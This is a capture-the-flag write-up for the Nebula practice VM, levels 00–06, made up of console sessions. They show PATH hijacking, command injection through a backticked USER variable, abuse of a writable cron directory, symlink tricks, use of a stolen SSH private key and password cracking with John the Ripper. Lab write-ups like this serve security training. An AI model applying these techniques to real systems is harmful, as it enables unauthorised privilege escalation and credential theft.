Nebula Writeup
==============

## 00
```console
level00@nebula:~$ find / -nowarn -perm +04000 -user flag00 2> /dev/null 
/bin/.../flag00
/rofs/bin/.../flag00
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ /bin/getflag 
You have successfully executed getflag on a target account
```

## 01
```console
level01@nebula:~$ ln -s /bin/getflag echo
level01@nebula:~$ PATH=.:$PATH /home/flag01/flag01
You have successfully executed getflag on a target account
```

## 02
```console
level02@nebula:~$ USER="\`/bin/getflag\`" /home/flag02/flag02 
You have successfully executed getflag on a target account is coolo
```

## 03
```console
level03@nebula:~$ cat run.sh 
#!/bin/bash
/bin/getflag > /tmp/flag03.out
level03@nebula:~$ chmod +x run.sh 
level03@nebula:~$ cp run.sh ../flag03/writable.d/
level03@nebula:~$ watch ls -l  ../flag03/writable.d/ /tmp
level03@nebula:~$ more /tmp/flag03.out 
You have successfully executed getflag on a target account
```

### 04
```console
level04@nebula:~$ ln -s ../flag04/token link
level04@nebula:~$ ../flag04/flag04 link 
06508b5e-8909-4f38-b630-fdb148a848a2
```

## 05 
```console
ls -la ../flag05/
total 5
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
ls -la ../flag05/.backup:
total 2
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:~$ cp ../flag05/.backup/backup-19072011.tgz ./
level05@nebula:~$ tar xvf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ssh -i .ssh/id_rsa flag05@localhost
flag05@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

## 06
```console
imac:run gwyn$ cat passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
imac:run gwyn$ ./john passwd
Warning: detected hash type "descrypt", but the string is also recognized as "descrypt-opencl"
Use the "--format=descrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2-16])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (flag06)
1g 0:00:00:00 DONE 2/3 (2018-04-01 12:36) 25.00g/s 425700p/s 425700c/s 425700C/s 123456..betabeta
Use the "--show" option to display all of the cracked passwords reliably
Session completed
...
level06@nebula:~$ su - flag06
Password: 
flag06@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

